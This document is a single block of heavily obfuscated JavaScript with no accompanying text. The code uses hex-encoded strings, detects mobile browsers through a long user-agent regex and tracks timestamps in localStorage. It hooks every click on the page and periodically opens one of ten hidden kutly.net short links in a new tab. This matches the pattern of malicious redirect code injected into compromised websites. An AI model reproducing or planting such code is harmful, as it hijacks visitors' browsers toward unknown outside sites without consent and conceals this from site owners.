function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());